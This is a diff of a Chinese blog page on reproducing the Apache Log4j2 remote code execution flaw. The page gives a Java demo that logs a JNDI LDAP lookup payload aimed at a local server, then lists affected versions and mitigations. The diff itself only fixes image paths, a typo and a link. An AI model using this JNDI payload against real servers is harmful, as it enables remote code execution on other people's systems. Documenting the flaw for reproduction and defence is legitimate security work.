@@ -90,7 +90,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">780</span>
+            <span class="post-count">792</span>
         </span>
     </span>
 
@@ -128,16 +128,16 @@
 
 
 <p>点击下载相应程序包资源</p>
-<p>![image-20211210134809897](Apache Log4j2RCE漏洞复现/image-20211210134809897.png)</p>
+<p>![image-20211210134809897](Apache Log4j2远程代码执行漏洞/image-20211210134809897.png)</p>
 <p>这里使用JNDI注入工具开启rmi服务或者idap服务执行本地命令，如下:</p>
-<p>![image-20211210135152549](Apache Log4j2RCE漏洞复现/image-20211210135152549.png)</p>
+<p>![image-20211210135152549](Apache Log4j2远程代码执行漏洞/image-20211210135152549.png)</p>
 <p>下面为测试Demo(由于我的jdk版本不适用RMI-JDNI注入，这里使用的是ldap协议)</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(Test.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/ehm23c&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 
 <p>运行结果:</p>
-<p>![image-20211210135519958](Apache Log4j2RCE漏洞复现/image-20211210135519958.png)</p>
+<p>![image-20211210135519958](Apache Log4j2远程代码执行漏洞/image-20211210135519958.png)</p>
 <h3 id="痕迹分析"><a href="#痕迹分析" class="headerlink" title="痕迹分析"></a>痕迹分析</h3><p>主要查看日志，观察日志中是否存在错误记录</p>
 <h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>经验证 2.15.0-rc1 版本存在绕过，实际受影响范围如下：</p>
 <p>Apache Log4j 2.x &lt; 2.15.0-rc2</p>
@@ -155,9 +155,9 @@
 <li>logstash</li>
 <li>kafka</li>
 </ul>
-<h3 id="防护方案"><a href="#防护方案" class="headerlink" title="防护方案"></a>防护方案</h3><p>1、禁止使用 log4j 服务器外连，升级 idk 11.0.1 8u191 7u201 6u211 或更高版本。 </p>
+<h3 id="防护方案"><a href="#防护方案" class="headerlink" title="防护方案"></a>防护方案</h3><p>1、禁止使用 log4j 服务器外连，升级 jdk 11.0.1 8u191 7u201 6u211 或更高版本。 </p>
 <p>2、升级至 log4j-2.15.0-rc2： </p>
-<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-</a> rc2 </p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a> </p>
 <p>3、紧急缓解措施： </p>
 <p>（1） 修改 jvm 参数 -Dlog4j2.formatMsgNoLookups=true </p>
 <p>（2） 修改配置 log4j2.formatMsgNoLookups=True </p>
